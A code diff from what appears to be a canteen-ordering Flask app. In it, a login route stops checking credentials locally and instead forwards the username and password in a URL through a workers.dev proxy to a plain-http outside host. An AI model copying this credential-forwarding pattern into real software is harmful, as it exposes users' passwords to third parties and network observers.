@@ -973,12 +973,5 @@ def iCanteen_order_food(username, password, date, food_id,canteen_id = get_cante
 @app.route("/strava/login/<username>,<password>")
 def strava_login(username, password):
     canteen_number = canteen_id_to_url(get_canteen_id())
-    try:
-        strava = StravaCZ(
-            username=username,
-            password=password,
-            canteen_number = canteen_number
-        )
-    except AuthenticationError as e:
-        return 0
-    return 1
+    page = requests.get(f"https://sparkling-sun-0a6e.humanhumanovic.workers.dev/?url=http://jidelna.qzz.io/strava/login/{username},{password},{canteen_number}")
+    return page.text
